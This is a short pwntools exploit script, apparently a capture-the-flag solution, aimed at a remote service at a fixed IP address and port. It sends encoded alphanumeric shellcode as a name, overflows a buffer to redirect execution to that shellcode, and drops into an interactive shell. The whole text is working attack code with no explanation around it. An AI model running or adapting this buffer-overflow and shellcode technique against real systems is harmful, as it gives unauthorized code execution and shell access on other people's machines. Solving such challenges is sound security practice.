from pwn import *

name = 0x6010c0
r = process('name')
r = remote('140.110.112.77', 2114)
r.recvuntil(']:')
payload = 'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V' 

r.sendline(payload)
r.recvuntil('me!')
r.send('a' * 0x18 + p64(name))
r.interactive()
